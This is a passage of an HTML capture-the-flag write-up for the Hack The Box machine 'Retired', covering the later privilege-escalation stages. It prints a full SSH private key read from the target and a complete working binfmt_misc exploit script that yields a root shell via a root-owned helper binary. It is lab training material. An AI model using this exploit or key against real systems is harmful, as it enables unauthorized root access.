+  inflating: var/www/html/assets/img/about/2.jpg  
+  inflating: var/www/html/assets/img/about/4.jpg  
+  inflating: var/www/html/assets/img/about/3.jpg  
+  inflating: var/www/html/assets/img/about/1.jpg  
+   creating: var/www/html/assets/img/logos/
+  inflating: var/www/html/assets/img/logos/facebook.svg  
+  inflating: var/www/html/assets/img/logos/microsoft.svg  
+  inflating: var/www/html/assets/img/logos/google.svg  
+  inflating: var/www/html/assets/img/logos/ibm.svg  
+   creating: var/www/html/assets/img/team/
+  inflating: var/www/html/assets/img/team/2.jpg  
+  inflating: var/www/html/assets/img/team/3.jpg  
+  inflating: var/www/html/assets/img/team/1.jpg  
+  inflating: var/www/html/assets/img/header-bg.jpg  
+  inflating: var/www/html/beta.html  
+  inflating: var/www/html/default.html   
+  inflating: var/www/html/index.php  
+   creating: var/www/html/css/
+  inflating: var/www/html/css/styles.css</code></pre>
+</doc-codeblock></div>
+<p>Reading the private key:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">www-data@retired:/var/www/test/var/www/html$ cat dev_key 
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+7rTyG3wbNka1sAAAALZGV2QHJldGlyZWQ=
+-----END OPENSSH PRIVATE KEY-----</code></pre>
+</doc-codeblock></div>
+<p>We can use this key to SSH in as <code v-pre>dev</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">caue@kali:~/htb/retired$ ssh -i dev.idrsa dev@10.10.11.154          
+The authenticity of host 10.10.11.154 (10.10.11.154) cant be established.
+ED25519 key fingerprint is SHA256:yJ9p3p5aZFrQR+J2qeIQ54gY9gQ7kcEbymYQBvP5PdY.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.154' (ED25519) to the list of known hosts.
+Linux retired 5.10.0-11-amd64 #1 SMP Debian 5.10.92-2 (2022-02-28) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Mar 28 11:36:17 2022 from 10.10.14.23
+dev@retired:~$</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="privilege-escalation-2">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#privilege-escalation-2">#</doc-anchor-trigger>
+        <span>Privilege escalation 2</span>
+    </h2>
+</doc-anchor-target>
+<p>As we SSH in as <code v-pre>dev</code> we see some interesting files and fodlers in the home directory:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">dev@retired:~$ ls -la
+total 40
+drwx------ 6 dev  dev  4096 Mar 11 14:36 .
+drwxr-xr-x 3 root root 4096 Mar 11 14:36 ..
+lrwxrwxrwx 1 root root    9 Oct 13  2021 .bash_history -&gt; /dev/null
+-rw------- 1 dev  dev   220 Aug  4  2021 .bash_logout
+-rw------- 1 dev  dev  3526 Aug  4  2021 .bashrc
+drwxr-xr-x 3 dev  dev  4096 Mar 11 14:36 .local
+-rw------- 1 dev  dev   807 Aug  4  2021 .profile
+drwx------ 2 dev  dev  4096 Mar 11 14:36 .ssh
+drwx------ 2 dev  dev  4096 Mar 11 14:36 activate_license
+drwx------ 3 dev  dev  4096 Mar 11 14:36 emuemu
+-rw-r----- 1 root dev    33 Apr 29 04:03 user.txt</code></pre>
+</doc-codeblock></div>
+<p>The emuemu directory:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">dev@retired:~/emuemu$ ls -la
+total 68
+drwx------ 3 dev dev  4096 Mar 11 14:36 .
+drwx------ 6 dev dev  4096 Mar 11 14:36 ..
+-rw------- 1 dev dev   673 Oct 13  2021 Makefile
+-rw------- 1 dev dev   228 Oct 13  2021 README.md
+-rw------- 1 dev dev 16608 Oct 13  2021 emuemu
+-rw------- 1 dev dev   168 Oct 13  2021 emuemu.c
+-rw------- 1 dev dev 16864 Oct 13  2021 reg_helper
+-rw------- 1 dev dev   502 Oct 13  2021 reg_helper.c
+drwx------ 2 dev dev  4096 Mar 11 14:36 test</code></pre>
+</doc-codeblock></div>
+<p>The <code v-pre>emuemu</code> binary is also found at <code v-pre>/usr/lib/emuemu/</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">dev@retired:~$ ls -la /usr/lib/emuemu/
+total 28
+drwxr-xr-x  2 root root  4096 Mar 11 14:36 .
+drwxr-xr-x 54 root root  4096 Mar 28 11:12 ..
+-rwxr-x---  1 root dev  16864 Oct 13 02:59 reg_helper</code></pre>
+</doc-codeblock></div>
+<p>We can read the source-code, not very interesting though:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<div class="codeblock-title">emuemu.c</div>
+<pre class="language-c"><code v-pre class="language-c">#include &lt;stdio.h&gt;
+
+/* currently this is only a dummy implementation doing nothing */
+
+int main(void) {
+    puts(&quot;EMUEMU is still under development.&quot;);
+    return 1;
+}</code></pre>
+</doc-codeblock></div>
+<p>We also see a <code v-pre>reg_helper</code> binary there and we can have a look at the source-code. The interesting part here is that this file is owned by <code v-pre>root</code>!  <code v-pre>/home/dev/emuemu/reg_helper.c</code>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<div class="codeblock-title">reg_helper.c</div>
+<pre class="language-c"><code v-pre class="language-c">#define _GNU_SOURCE
+
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(void) {
+    char cmd[512] = { 0 };
+
+    read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0;
+
+    int fd = open(&quot;/proc/sys/fs/binfmt_misc/register&quot;, O_WRONLY);
+    if (-1 == fd)
+        perror(&quot;open&quot;);
+    if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1)
+        perror(&quot;write&quot;);
+    if (close(fd) == -1)
+        perror(&quot;close&quot;);
+
+    return 0;
+}</code></pre>
+</doc-codeblock></div>
+<p>It seems that the <code v-pre>reg_helper</code> is using <code v-pre>/proc/sys/fs/binfmt_misc/register</code> to run some commands. At first I didn&#x27;t know much about <code v-pre>binfmt_misc</code> so I did a bit of research and learn the basics of usage.</p>
+<p>Based on Wikipedia, <strong>binfmt_misc</strong> (<em>Miscellaneous Binary Format</em>) is a capability of the <a href="https://en.wikipedia.org/wiki/Linux_kernel" title="Linux kernel">Linux kernel</a> which allows arbitrary <a href="https://en.wikipedia.org/wiki/Executable_file_format" title="Executable file format">executable file formats</a> to be recognized and passed to certain <a href="https://en.wikipedia.org/wiki/User_space" title="User space">user space</a> applications, such as <a href="https://en.wikipedia.org/wiki/Emulator" title="Emulator">emulators</a> and <a href="https://en.wikipedia.org/wiki/Virtual_machine" title="Virtual machine">virtual machines</a>.It is one of a number of binary format handlers in the kernel that are involved in preparing a user-space program to run.</p>
+<p>We can check how EMUEMU is used:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">dev@retired:~$ cat /proc/sys/fs/binfmt_misc/EMUEMU 
+enabled
+interpreter /usr/bin/emuemu
+flags: 
+offset 0
+magic 13374f53545249434800524f4d00</code></pre>
+</doc-codeblock></div>
+<p>So files that starts with that &quot;magic&quot; signature will be interpreted by <code v-pre>/usr/bin/emuemu</code>.</p>
+<doc-anchor-target id="road-to-root">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#road-to-root">#</doc-anchor-trigger>
+        <span>Road to root</span>
+    </h3>
+</doc-anchor-target>
+<p>During my research I found <a href="https://github.com/toffan/binfmt_misc/blob/master/binfmt_rootkit">this github repository</a> which is a POC to exploit this functionality.
+We can make a copy of that and do some modifications to make it work for us.
+Modify the last line:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Original
+echo &quot;$binfmt_line&quot; &gt; &quot;$mountpoint&quot;/register
+
+# Modified
+echo &quot;$binfmt_line&quot; | /usr/lib/emuemu/reg_helper</code></pre>
+</doc-codeblock></div>
+<p>Final exploit:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">#!/bin/bash
+
+readonly searchsuid=&quot;/bin/&quot;
+readonly mountpoint=&quot;/proc/sys/fs/binfmt_misc&quot;
+readonly exe=&quot;$0&quot;
+
+
+warn()
+{
+    1&gt;&amp;2 echo $@
+}
+
+die()
+{
+    warn $@
+    exit -1
+}
+
+usage()
+{
+    cat 1&gt;&amp;2 &lt;&lt;EOF
+Usage: $exe
+    Gives you a root shell if /proc/sys/fs/binfmt_misc/register is writeable,
+    note that it must be enforced by any other mean before your try this, for
+    example by typing something like &quot;sudo chmod +6 /*/*/f*/*/*r&quot; while Dave is
+    thinking that you are fixing his problem.
+EOF
+    exit 1
+}
+
+function pick_suid()
+{
+	find &quot;$1&quot; -perm -4000 -executable \
+	    | tail -n 1
+}
+
+function read_magic()
+{
+    [[ -e &quot;$1&quot; ]] &amp;&amp; \
+    [[ &quot;$2&quot; =~ [[:digit:]]+ ]] &amp;&amp; \
+    dd if=&quot;$1&quot; bs=1 count=&quot;$2&quot; status=none \
+        | sed -e 's-\x00-\\x00-g'
+}
+
+[[ -n &quot;$1&quot; ]] &amp;&amp; usage
+
+target=&quot;$(pick_suid &quot;$searchsuid&quot;)&quot;
+test -e &quot;$target&quot; || die &quot;Error: Unable to find a suid binary in $searchsuid&quot;
+
+binfmt_magic=&quot;$(read_magic &quot;$target&quot; &quot;126&quot;)&quot;
+test -z &quot;$binfmt_magic&quot; &amp;&amp; die &quot;Error: Unable to retrieve a magic for $target&quot;
+
+fmtname=&quot;$(mktemp -u XXXX)&quot;
+fmtinterpr=&quot;$(mktemp)&quot;
+
+gcc -o &quot;$fmtinterpr&quot; -xc - &lt;&lt;- __EOF__
+	#include &lt;stdlib.h&gt;
+	#include &lt;unistd.h&gt;
+	#include &lt;stdio.h&gt;
+	#include &lt;pwd.h&gt;
+
+	int main(int argc, char *argv[])
+	{
+		// remove our temporary file
+		unlink(&quot;$fmtinterpr&quot;);
+
+		// remove the unused binary format
+		FILE* fmt = fopen(&quot;$mountpoint/$fmtname&quot;, &quot;w&quot;);
+		fprintf(fmt, &quot;-1\\n&quot;);
+		fclose(fmt);
+
+		// MOTD
+		setuid(0);
+		uid_t uid = getuid();
+		uid_t euid = geteuid();
+		struct passwd *pw = getpwuid(uid);
+		struct passwd *epw = getpwuid(euid);
+		fprintf(stderr, &quot;uid=%u(%s) euid=%u(%s)\\n&quot;,
+			uid,
+			pw-&gt;pw_name,
+			euid,
+			epw-&gt;pw_name);
+
+		// welcome home
+		char* sh[] = {&quot;/bin/sh&quot;, (char*) 0};
+		execvp(sh[0], sh);
+		return 1;
+	}
+__EOF__
+
+chmod a+x &quot;$fmtinterpr&quot;
+
+binfmt_line=&quot;_${fmtname}_M__${binfmt_magic}__${fmtinterpr}_OC&quot;
+echo &quot;$binfmt_line&quot; | /usr/lib/emuemu/reg_helper
+
+exec &quot;$target&quot;</code></pre>
+</doc-codeblock></div>
+<p>And we are root!</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none"># id
+uid=0(root) gid=1001(dev) groups=1001(dev),33(www-data)
+# ls -la /root
+total 28
+drwx------  3 root root 4096 Mar 11 14:36 .
+drwxr-xr-x 18 root root 4096 Mar 11 14:52 ..
+lrwxrwxrwx  1 root root    9 Oct 13  2021 .bash_history -&gt; /dev/null
+-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
+drwxr-xr-x  3 root root 4096 Mar 11 14:36 .local
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+-rwxr-xr-x  1 root root  135 Mar 11 13:22 cleanup.sh
+-rw-r-----  1 root root   33 Apr 29 04:03 root.txt</code></pre>
+</doc-codeblock></div>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results />
+                            </div>
+                            <footer class="clear-both">
+                            
+                                <nav class="flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/phoenix/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block mt-1">Phoenix</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/routerspace/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block mt-1">Routerspace</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between">
+                                <div>
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2022. Caue All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="docs-overlay-target"></div>
+
+    <script>window.__DOCS__ = { "title": "Retired", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
+</body>
+</html>
